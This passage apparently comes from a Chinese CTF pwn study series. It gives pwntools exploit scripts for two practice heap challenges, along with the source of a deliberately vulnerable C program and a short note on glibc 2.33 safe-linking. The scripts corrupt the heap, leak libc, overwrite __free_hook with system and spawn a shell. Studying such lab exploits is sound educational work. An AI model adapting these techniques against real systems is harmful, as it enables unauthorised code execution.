
```
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79 | `from` `pwn` `import` `*`  `r``=``process(``'./old_school_revenge'``)`  `#r=remote('123.60.63.39','49153')`  `libc``=``ELF(``'/lib/x86_64-linux-gnu/libc.so.6'``)`  `def` `add(idx,size):`  `r.recv()`  `r.sendline(``'1'``)`  `r.recv()`  `r.sendline(``str``(idx))`  `r.recv()`  `r.sendline(``str``(size))`    `def` `edit(idx,con):`  `r.recv()`  `r.sendline(``'2'``)`  `r.recv()`  `r.sendline(``str``(idx))`  `r.recv()`  `r.sendline(con)`    `def` `show(idx):`  `r.recv()`  `r.sendline(``'3'``)`  `r.recv()`  `r.sendline(``str``(idx))`  `def` `dele(idx):`  `r.recv()`  `r.sendline(``'4'``)`  `r.recv()`  `r.sendline(``str``(idx))`  `o_g` `=` `[``0x4f2c5``,``0x4f322``,``0x10a38c``]`  `l64` `=` `lambda`      `:u64(r.recvuntil(``"\x7f"``)[``-``6``:].ljust(``8``,``"\x00"``))`  `l32` `=` `lambda`      `:u32(r.recvuntil(``"\xf7"``)[``-``4``:].ljust(``4``,``"\x00"``))`  `sla` `=` `lambda` `a,b  :r.sendlineafter(``str``(a),``str``(b))`  `sa` `=` `lambda` `a,b  :r.sendafter(``str``(a),``str``(b))`  `lg` `=` `lambda` `name,data : r.success(name` `+` `": 0x%x"` `%` `data)`  `se` `=` `lambda` `payload: r.send(payload)`  `sl` `=` `lambda` `payload: r.sendline(payload)`  `ru` `=` `lambda` `a     :r.recvuntil(``str``(a))`  `for` `i` `in` `range``(``7``):`  `add(i,``0xf8``)`  `add(``7``,``0xf8``)``#7`  `add(``8``,``0x88``)``#8`  `add(``9``,``0xf8``)``#9`  `add(``10``,``0x88``)``#10`  `for` `i` `in` `range``(``7``):`  `dele(i)`  `dele(``8``)`  `dele(``7``)`  `add(``11``,``0x88``)`  `edit(``11``,``"a"``*``0x80``+``p64(``0x90``+``0x100``))`  `dele(``9``)`  `for` `i` `in` `range``(``7``):`  `add(i,``0xf8``)`  `edit(i,``"/bin/sh\x00"``)`  `add(``12``,``0xf8``)`  `show(``12``)`      `libc_base` `=` `l64()``-``0x3ebf20`  `lg(``"libc_base"``,libc_base)`  `free``=``libc_base``+``libc.sym[``'__free_hook'``]`  `sys``=``libc_base``+``libc.sym[``'system'``]`  `add(``13``,``0x88``)`  `dele(``0``)`  `dele(``9``)`  `add(``14``,``0x88``)`  `dele(``11``)`  `edit(``13``,p64(free)``+``'\n'``)`    `add(``22``,``0x88``)`    `edit(``22``,``'/bin/sh\x00'``)`    `add(``23``,``0x88``)`  `edit(``23``,p64(sys))`  `dele(``22``)`    `r.interactive()` |
```

# 第七天附件
附件：
链接：[9e9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4e0h3k6E0M7X3V1K6e0p5S2t1K9@1V1H3c8g2A6E0g2Y4u0c8k6p5I4#2b7g2)9K6c8Y4m8%4k6q4)9K6c8r3^5J5P5h3b7`.](https://bbs.kanxue.com/elink@050K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4e0h3k6E0M7X3V1K6e0p5S2t1K9@1V1H3c8g2A6E0g2Y4u0c8k6p5I4#2b7g2)9K6c8Y4m8%4k6q4)9K6c8r3^5J5P5h3b7`.)
提取码：n2yd
--来自百度网盘超级会员V3的分享

# 第八天
## 前言
今天东西就一个，2.33版本的堆申请，2.34的题我想讲，奈何太菜了，没找到相关资料（今年湖湘杯的线上赛题目我没保存，有一道是2.34，祭），how2heap上面的话有点抽象看的。我要是学会了，就会来更新。
（痛苦面具，HWS又改线上了┭┮﹏┭┮ o(╥﹏╥)o）

## b站up主推荐
星盟，国资社畜(你有多想pwn)

## 2.33堆申请规则
先形成`tcache`然后第一个`tcache`的`fd`位存放着`tcache chunk`地址的左移12位数值，这个值就是整个程序的异或`key`
其余的堆下次申请地址的时候都会和这个`key`异或一次。

### 源码
```
|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47  48  49  50  51  52  53  54  55  56  57  58  59  60  61  62  63  64  65  66  67  68  69  70  71  72  73  74  75  76  77  78  79  80  81  82  83  84  85  86  87  88  89  90  91  92  93  94  95  96  97 | `#include<stdio.h>`  `#include<stdlib.h>`  `char` `*heaparray[24];`  `int` `num=0;`  `void` `init()`  `{`  `setvbuf``(stdin, 0LL, 2, 0LL);`  `setvbuf``(stdout, 0LL, 2, 0LL);`  `setvbuf``(stderr, 0LL, 2, 0LL);`    `}`  `void` `create_heap() {`  `int` `i;`  `for` `(i = 0; i < 24; i++) {`  `if` `(!heaparray[i]) {`  `heaparray[i] = (``char` `*)``malloc``(0x90);`  `if` `(!heaparray[i]) {`  `puts``(``"error"``);`  `exit``(2);`  `}`  `puts``(``"over\n"``);`  `num++;`  `break``;`  `}`  `}`  `}`  `void` `delete_heap() {`  `int` `idx;`  `char` `buf[4];`  `puts``(``"idx"``);`  `read(0, buf, 4);`  `idx =` `atoi``(buf);`  `if` `(idx < 0 || idx >= 24) {`  `puts``(``"error"``);`  `exit``(0);`  `}`  `if` `(heaparray[idx]) {`  `free``(heaparray[idx]);`  `puts``(``"over\n"``);`  `num--;`  `}` `else` `{`  `puts``(``"error\n"``);`  `}`  `}`  `void` `show_item() {`  `int` `i;`  `int` `idx;`  `char` `buf[4];`  `puts``(``"idx"``);`  `(read(0, buf, 4));`  `idx =` `atoi``(buf);`  `if` `(!heaparray[idx]) {`  `puts``(``"no hvae things\n"``);`  `}` `else` `{`  `printf``(``"Content:"``);`  `printf``(``"%s"``,heaparray[idx]);`  `}`  `}`  `void` `edit_item(){`  `int` `i;`  `int` `idx;`  `char` `buf[4];`  `puts``(``"idx"``);`  `(read(0, buf, 4));`  `idx =` `atoi``(buf);`  `if` `(!heaparray[idx]) {`  `puts``(``"no hvae things\n"``);`  `}` `else` `{`  `puts``(``"Content:"``);`  `read(0,heaparray[idx], 0x90);`  `}`  `}`  `void` `menu()`  `{`  `puts``(``"1. Get a page"``);`  `puts``(``"2. Take out"``);`  `puts``(``"3. Read page"``);`  `puts``(``"4. edit a page"``);`  `}`  `void` `main()`  `{`  `init();`  `int` `i;`  `while``(1)`  `{`  `menu();`  `scanf``(``"%d"``,&i);`  `switch``(i)`  `{`  `case` `1:create_heap();``break``;`  `case` `2:delete_heap();``break``;`  `case` `3:show_item();``break``;`  `case` `4:edit_item();``break``;`  `default``:``puts``(``"error"``);``break``;`  `}`  `}`  `}` |
```

### exp
```
|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36  37  38  39  40  41  42  43  44  45  46  47 | `#encoding=utf-8`  `#patchelf --set-interpreter ./glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so --set-rpath ./glibc-all-in-one/libs/2.33-0ubuntu5_amd64 newyearbook`  `from` `pwn` `import` `*`  `r``=``process(``'./pwn'``)`  `context.log_level``=``'debug'`  `libc``=``ELF(``'/home/q/Desktop/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6'``)`  `def` `add():`  `r.sendlineafter(``"4. edit a page\n"``,``str``(``1``))`    `def` `dele(idx):`  `r.sendlineafter(``"4. edit a page\n"``,``str``(``2``))`  `r.sendlineafter(``"idx\n"``,``str``(idx))`    `def` `show(idx):`  `r.sendlineafter(``"4. edit a page\n"``,``str``(``3``))`  `r.sendlineafter(``"idx\n"``,``str``(idx))`  `def` `edit(idx,con):`  `r.sendlineafter(``"4. edit a page\n"``,``str``(``4``))`  `r.sendlineafter(``"idx\n"``,``str``(idx))`  `r.sendafter(``"Content:"``,con)`  `for` `i` `in` `range``(``10``):`  `add()`  `for` `i` `in` `range``(``9``):`  `dele(i)`    `show(``0``)`  `r.recvuntil(``"Content:"``)`  `heap1``=``u64(r.recv(``5``)``+``b``'\x00'``*``3``)`  `print``(``hex``(heap1))`  `edit(``7``,``'\xa0'``)`  `show(``7``)`  `r.recvuntil(``"Content:"``)`  `libc``=``u64(r.recv(``6``)``+``b``'\x00'``*``2``)``-``0x1e0ca0`  `print``(``hex``(libc))`  `system``=` `libc``+``0x04fa60`  `f_hook` `=` `libc``+``0x1e3e20`  `real``=``((f_hook^heap1))`  `print` `(``hex``(real))`  `edit(``7``,``'\x00'``)`  `edit(``6``,p64(real))`  `add()`  `add()`  `edit(``10``,``"/bin/sh\x00"``)`  `edit(``11``,p64(system))`  `dele(``10``)`  `#gdb.attach(r)`  `r.interactive()` |
```

# 第八天附件
附件：
链接：[779K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4x3e0k6Y4z5i4S2Z5L8V1I4A6M7p5q4c8e0%4y4K6K9V1N6x3z5h3k6%4b7g2)9K6c8Y4m8%4k6q4)9K6c8s2N6X3k6%4V1`.](https://bbs.kanxue.com/elink@666K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4x3e0k6Y4z5i4S2Z5L8V1I4A6M7p5q4c8e0%4y4K6K9V1N6x3z5h3k6%4b7g2)9K6c8Y4m8%4k6q4)9K6c8s2N6X3k6%4V1`.)
提取码：wfgy
--来自百度网盘超级会员V3的分享

# 第九天附件
